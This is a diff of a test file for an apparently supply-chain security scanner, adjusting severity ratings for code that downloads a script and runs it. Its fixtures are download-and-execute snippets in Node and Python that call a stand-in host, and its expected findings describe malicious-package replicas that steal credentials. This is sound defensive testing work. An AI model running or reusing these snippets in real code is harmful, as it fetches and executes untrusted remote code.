@@ -14,7 +14,7 @@ import assert from "node:assert/strict";
 import { mkdtempSync, mkdirSync, writeFileSync, readFileSync, rmSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join, dirname } from "node:path";
-import { run, runsReceivedCode, runsSubstitutedDownload, importTimeRisk, installScriptRisk, scanGyp } from "../src/index.js";
+import { run, runsReceivedCode, runsSubstitutedDownload, importTimeRisk, importTimeSeverity, installScriptRisk, scanGyp } from "../src/index.js";
 
 const U = "'https://files.invalid/p'";
 const REASON = "runs code it receives over the network";
@@ -126,17 +126,20 @@ test("deserialization and dynamic import of a received value", () => {
     .includes(IMPORT_REASON));
 });
 
-test("download to a file, then run it, is MAJOR-only", () => {
+test("download to a file, then run it, is MAJOR-only (CRITICAL run with Python)", () => {
   const cases = [
-    ["const body = await (await fetch(" + U + ")).text();\nfs.writeFileSync('m.js', body);\nrequire('./m.js');\n", 3],
+    ["const body = await (await fetch(" + U + ")).text();\nfs.writeFileSync('m.js', body);\nrequire('./m.js');\n", 3,
+      DROP_REASON, "MAJOR"],
     ["import requests, subprocess, sys\ndata = requests.get(" + U + ").content\n" +
-     "open('x.py', 'wb').write(data)\nsubprocess.run([sys.executable, 'x.py'])\n", 4],
+     "open('x.py', 'wb').write(data)\nsubprocess.run([sys.executable, 'x.py'])\n", 4,
+      "downloads a script and runs it with Python", "CRITICAL"],
   ];
-  for (const [text, line] of cases) {
+  for (const [text, line, reason, sev] of cases) {
     const [reasons, at] = importTimeRisk(text);
-    assert.ok(reasons.includes(DROP_REASON), text.slice(0, 60));
+    assert.ok(reasons.includes(reason), text.slice(0, 60));
+    assert.equal(importTimeSeverity(reasons), sev);
     assert.equal(at, line);
-    assert.deepEqual(installScriptRisk(text), []);        // never escalates an install hook
+    assert.deepEqual(installScriptRisk(text), []);        // never escalates an npm install hook
   }
   // written but not run, and run but not downloaded: neither fires
   assert.ok(!importTimeRisk("const b = await (await fetch(u)).text();\nfs.writeFileSync('c.json', b);\n")[0]
@@ -214,7 +217,7 @@ test("--deps: the Miasma and TrapDoor replicas", () => {
     const got = rep.issues.filter((i) => i.rule.startsWith("SC-")).map((i) => [i.rule, i.file.replaceAll("\\", "/"), i.sev, i.msg]);
     const env = "reads environment variables or credential files and sends data over the network";
     assert.deepEqual(got.sort(), [
-      ["SC-IMPORT-RISK", "venv/lib/python3.12/site-packages/trapdoor_py/__init__.py", "MAJOR", `Dependency code ${REASON}.`],
+      ["SC-IMPORT-RISK", "venv/lib/python3.12/site-packages/trapdoor_py/__init__.py", "CRITICAL", `Dependency code ${REASON}.`],
       ["SC-INSTALL-HOOK", "node_modules/miasma/binding.gyp", "CRITICAL", `Install hook runs index.js, which ${env}.`],
       ["SC-INSTALL-HOOK", "node_modules/miasma/binding.gyp", "MAJOR",
         "\"install (implicit)\" script runs code at install time: 'node-gyp rebuild'."],
